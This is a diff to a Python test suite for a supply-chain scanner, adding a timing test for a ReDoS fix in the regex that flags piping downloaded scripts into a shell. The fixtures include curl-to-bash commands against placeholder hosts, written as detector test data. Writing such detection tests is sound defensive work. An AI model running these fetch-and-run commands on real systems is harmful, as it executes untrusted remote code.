@@ -13,6 +13,7 @@ import subprocess
 import sys
 import tempfile
 import textwrap
+import time
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -697,6 +698,14 @@ class TestSecD11FetchedCode(SupplyChainCase):
             with self.subTest(line=line):
                 self.fx.write("svc/Dockerfile", "FROM scratch\n" + line + "\n")
                 self.assertIn("PIPE-SHELL", self.fx.rules())
+
+    def test_sec_d_11_the_pipe_scan_is_linear_in_env_assignments(self) -> None:
+        # Each `env !==!` split two ways before: 30 of them took minutes (CodeQL py/redos).
+        line = "curl x | " + "env !==! " * 5000 + "!"
+        started = time.perf_counter()
+        self.assertIsNone(sc._PIPE_SHELL.search(line))
+        self.assertLess(time.perf_counter() - started, 1.0)
+        self.assertIsNotNone(sc._PIPE_SHELL.search("curl -s https://x.example/i | env B=x=y bash"))
 
     def test_sec_d_11_a_pipe_in_a_workflow_or_a_composite_action_fails(self) -> None:
         self.fx.write(".github/workflows/x.yml", "jobs:\n  a:\n    steps:\n      - run: curl -fsSL https://get.x.example | bash\n")
